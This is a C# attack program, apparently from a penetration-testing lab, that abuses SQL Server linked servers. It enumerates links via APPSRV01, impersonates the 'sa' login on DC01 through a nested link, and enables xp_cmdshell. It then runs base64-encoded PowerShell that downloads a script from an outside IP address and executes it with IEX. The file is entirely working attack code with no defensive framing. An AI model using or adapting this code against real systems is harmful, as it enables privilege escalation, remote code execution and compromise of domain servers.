using System;
using System.Data.SqlClient;

namespace follow_the_link
{
    class Program
    {
        static void Main(string[] args)
        {
            String server = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + server + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth Success");
            }
            catch
            {
                Console.WriteLine("Auth Failed");
                Environment.Exit(0);
            }

            String execCMD = "EXEC('sp_linkedservers') AT APPSRV01;";

            SqlCommand command = new SqlCommand(execCMD, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("Linked SQL servers =>" + reader[0]);
            }
            reader.Close();
            String login = "EXEC ('EXEC (''EXECUTE AS LOGIN = ''''sa'''';'') AT DC01') AT APPSRV01";
            String enable_xpcmd = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE; EXEC sp_configure ''''xp_cmdshell'''',1;RECONFIGURE;'') AT DC01') AT APPSRV01";
            String query = "EXEC ('EXEC (''xp_cmdshell ''''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADYANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='''';'')AT DC01') AT APPSRV01";

            command = new SqlCommand(login, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Close();


            con.Close();
        }
    }
}
